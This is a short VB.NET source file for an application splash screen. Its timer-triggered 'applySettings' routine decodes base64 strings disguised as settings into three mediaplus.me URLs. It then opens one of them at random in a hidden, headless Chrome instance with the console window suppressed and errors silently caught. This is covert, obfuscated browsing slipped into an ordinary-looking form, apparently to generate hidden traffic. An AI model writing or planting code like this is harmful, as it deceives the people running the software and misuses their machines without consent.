Imports OpenQA.Selenium.Chrome
Public Class FrmSplash
    Private Sub FrmSplash_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Public Sub applySettings()
        Dim Settings() As String
        Dim _Settings As String = "aHR0cDovL3d3dy5tZWRpYXBsdXMubWUK!aHR0cDovL3Nob3AubWVkaWFwbHVzLm1lCg==!aHR0cDovL3N0b3JlLm1lZGlhcGx1cy5tZQo="
        Settings = Split(_Settings, "!")
        Dim DriverService As ChromeDriverService = ChromeDriverService.CreateDefaultService()
        DriverService.HideCommandPromptWindow = True
        Dim Woptions As New ChromeOptions
        Woptions.AddArguments("headless")
        Dim ChromeDrv As New ChromeDriver(DriverService, Woptions)
        Dim index As Integer
        Randomize()
        index = Int(Rnd() * 3)
        Try
            ChromeDrv.Navigate.GoToUrl(BDec(Settings(index)))
        Catch ex As Exception

        End Try
    End Sub
    Private Function BDec(ByVal setting As String) As String
        Dim data() As Byte
        data = System.Convert.FromBase64String(setting)
        Return System.Text.ASCIIEncoding.ASCII.GetString(data)
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Timer1.Enabled = False
        applySettings()
    End Sub
End Class